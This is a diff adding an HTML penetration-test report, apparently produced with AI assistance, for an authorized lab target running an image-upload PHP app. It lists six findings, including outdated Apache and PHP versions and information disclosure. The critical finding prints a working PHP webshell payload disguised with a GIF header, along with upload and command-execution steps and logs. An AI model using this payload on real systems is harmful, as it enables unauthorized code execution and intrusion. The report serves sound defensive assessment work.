@@ -1,0 +1,474 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqy3bzn7-ukmd7w</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unrestricted PHP File Upload leading to Remote Code Execution</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — multiple known CVEs (CVE-2019-0211 privesc, CVE-2021-40438 mod_proxy SSRF)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life PHP 7.1.33 — unsupported branch, no security patches since Dec 2019</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] PHP Error Message Reveals Server Filesystem Path</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Apache server version disclosed in error page bodies</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Frameable response (potential Clickjacking)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqy3bzn7-ukmd7w</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32825/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T17:56:39.349Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32825</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unrestricted PHP File Upload leading to Remote Code Execution</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32825/</div>
+<div class="desc">The image upload endpoint at POST /index.php accepts PHP files without any extension or content-type restriction. By uploading a PHP webshell disguised with a GIF magic-byte prefix (GIF89a), the server stores the file in the web-accessible /upload/ directory and executes it as PHP. Confirmed OS command execution as www-data: `id` returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, `hostname` returned `a1021f31eb5e`. Full server path disclosed by PHP error: /var/www/html/upload/. The upload requires no authentication.</div>
+<div><b>Reproduction</b></div><pre>1. POST /index.php with multipart/form-data; upload field name=userfile, filename=shell.php, Content-Type=image/gif, body=GIF89a&lt;?php system($_GET['c']);?&gt;\n2. Server responds 200 and stores file at /upload/shell.php (confirmed via page showing img src)\n3. GET /upload/shell.php?c=id → returns GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3gxwe-6</code> — <code>artifacts/s-0001/ev-mqy3gxwe-6/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/shell.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:00:30 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3qnsj-x</code> — <code>artifacts/s-0001/ev-mqy3qnsj-x/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/verdictwebshell.php?c=id HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 60
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:03 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3qo99-y</code> — <code>artifacts/s-0001/ev-mqy3qo99-y/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/verdictwebshell.php?c=hostname HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 19
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:04 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+GIF89aa1021f31eb5e</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — multiple known CVEs (CVE-2019-0211 privesc, CVE-2021-40438 mod_proxy SSRF)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32825/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The server advertises `Server: Apache/2.4.38 (Debian)` (fingerprinted from the Server response header; additionally corroborated by the Apache 2.4.38 signature in the 404 error-page footer — see negative-control evidence). Apache httpd 2.4.38 was released Jan 2019 and is far behind the current 2.4.x branch; it is affected by numerous published CVEs, notably:
+- CVE-2019-0211 (CVSS 7.8, HIGH): local privilege escalation via the scoreboard; affects 2.4.17–2.4.38, fixed in 2.4.39 — directly applicable to this exact version.
+- CVE-2021-40438 (CVSS 9.0, CRITICAL): mod_proxy SSRF/request forwarding; affects httpd ≤ 2.4.48 — applicable if mod_proxy is enabled (not verified here).
+- CVE-2019-0217 (mod_auth_digest access-control bypass) and CVE-2019-0220 (inconsistent URL normalization), both fixed in 2.4.39.
+- Later request-smuggling/mod_lua issues (e.g. CVE-2022-22720, CVE-2021-44790) also post-date 2.4.38.
+Severity set to HIGH on the version-confirmed local-privesc CVE-2019-0211; the critical mod_proxy SSRF (CVE-2021-40438) raises this further where mod_proxy is in use. The operator should verify the exact patch level (Debian backports security fixes without changing the advertised version string) and which modules are enabled before relying on exploitability.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32825/ → 200, response carries `Server: Apache/2.4.38 (Debian)` (positive replays ev-mqy47n2z-1z and ev-mqy47o6l-20, identical 503-byte bodies). 2. The version is independently visible in the default 404 error page footer: GET http://target.local:32825/verdict-no-such-path-404-control → 404 body contains `Apache/2.4.38 (Debian) Server at ... Port 32825` (ev-mqy47p4k-21). 3. Compare 2.4.38 against the published CVE list / current 2.4.x to confirm missing patches.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47p4k-21</code> — <code>artifacts/_/ev-mqy47p4k-21/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-no-such-path-404-control HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:21:18 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47n2z-1z</code> — <code>artifacts/_/ev-mqy47n2z-1z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 503
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:21:15 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdictstoXmqy40xg6ad8tsafe.jpg&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47o6l-20</code> — <code>artifacts/_/ev-mqy47o6l-20/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 503
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:21:17 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdictstoXmqy40xg6ad8tsafe.jpg&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [vulnerable-component] End-of-life PHP 7.1.33 — unsupported branch, no security patches since Dec 2019</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32825/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The app discloses `X-Powered-By: PHP/7.1.33` (fingerprinted from the X-Powered-By response header on / and /index.php). PHP 7.1.33 (Oct 2019) was the FINAL release of the 7.1 series; the 7.1 branch reached end-of-life on 2019-12-01 and has received no security support since. An EOL runtime accumulates unpatched vulnerabilities — any PHP security issue disclosed after Dec 2019 and fixed only in the then-supported 7.2/7.3/7.4/8.x branches remains open in 7.1.33. Representative example never patched in 7.1: CVE-2020-7066 (get_headers() truncation on a NUL byte → SSRF/information disclosure; fixed in 7.2.28/7.3.15/7.4.3, 7.1 already EOL). The headline risk is the unsupported, unmaintained status itself rather than a single confirmed unauthenticated RCE in this build, hence MEDIUM. Remediation: upgrade to a supported PHP release (8.2+). Note: Debian/distro packagers may backport fixes without changing the version string — verify the actual build date before relying on a specific CVE.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32825/ → 200 with `X-Powered-By: PHP/7.1.33` (positive replay ev-mqy47n2z-1z). 2. GET http://target.local:32825/index.php → 200, same `X-Powered-By: PHP/7.1.33` banner, stable (positive replay ev-mqy47o6l-20). 3. Negative control: GET http://target.local:32825/verdict-no-such-path-404-control → distinguishable 404 (279 bytes vs 503) (ev-mqy47p4k-21). 4. Cross-reference 7.1 EOL date (2019-12-01) and post-EOL PHP CVEs to confirm the branch is unsupported.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47p4k-21</code> — <code>artifacts/_/ev-mqy47p4k-21/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-no-such-path-404-control HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:21:18 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47n2z-1z</code> — <code>artifacts/_/ev-mqy47n2z-1z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 503
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:21:15 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdictstoXmqy40xg6ad8tsafe.jpg&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy47o6l-20</code> — <code>artifacts/_/ev-mqy47o6l-20/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 503
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:21:17 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdictstoXmqy40xg6ad8tsafe.jpg&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [info-disclosure] PHP Error Message Reveals Server Filesystem Path</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32825/</div>
+<div class="desc">When the uploaded PHP webshell is accessed without the required `c` query parameter, PHP emits an unhandled error that discloses the full filesystem path: /var/www/html/upload/verdictwebshell.php. PHP error display is not suppressed in production (display_errors=On or equivalent). This is secondary to the RCE finding (f-001) but shows error verbosity is unmitigated.</div>
+<div><b>Reproduction</b></div><pre>1. Upload PHP file per f-001 steps to obtain /upload/shell.php\n2. GET /upload/shell.php (no c param)\n3. Response body: GIF89a Warning: system(): Cannot execute a blank command in /var/www/html/upload/shell.php on line 1</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3gxwe-6</code> — <code>artifacts/s-0001/ev-mqy3gxwe-6/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/shell.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:00:30 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3py89-v</code> — <code>artifacts/s-0001/ev-mqy3py89-v/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/verdictwebshell.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 144
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:07:30 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+GIF89a&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  system(): Cannot execute a blank command in &lt;b&gt;/var/www/html/upload/verdictwebshell.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3s8o7-14</code> — <code>artifacts/s-0001/ev-mqy3s8o7-14/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/verdictwebshell.php HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 144
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:09:17 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+GIF89a&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  system(): Cannot execute a blank command in &lt;b&gt;/var/www/html/upload/verdictwebshell.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [info-disclosure] Apache server version disclosed in error page bodies</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32825/</div>
+<div class="desc">The default Apache `ServerSignature On` setting causes all error pages (403, 404, 500…) to include the exact server version and OS in the HTML `&lt;address&gt;` footer: `Apache/2.4.38 (Debian) Server at target.local Port 32825`. The 200 root page body contains no such string. An attacker can trivially fingerprint the server to target known CVEs for Apache 2.4.38.</div>
+<div><b>Reproduction</b></div><pre>1. Send GET /upload/ — receive a 403 HTML page.
+2. Observe the &amp;lt;address&amp;gt; footer: &quot;Apache/2.4.38 (Debian) Server at … Port 32825&quot;.
+3. Compare with GET / (200): body contains no server version string.
+Fix: set `ServerTokens Prod` and `ServerSignature Off` in Apache configuration.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3vgd9-17</code> — <code>artifacts/s-0002/ev-mqy3vgd9-17/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 492
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:11:47 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdicttraversal.gif&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3u419-16</code> — <code>artifacts/s-0002/ev-mqy3u419-16/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/ HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:10:44 GMT
+keep-alive: timeout=5, max=68
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3wj52-19</code> — <code>artifacts/s-0002/ev-mqy3wj52-19/</code></div><div class="lbl">REQUEST</div><pre>GET /upload/ HTTP/1.1
+Host: target.local:32825
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:12:37 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32825&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 6. [burp] Frameable response (potential Clickjacking)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
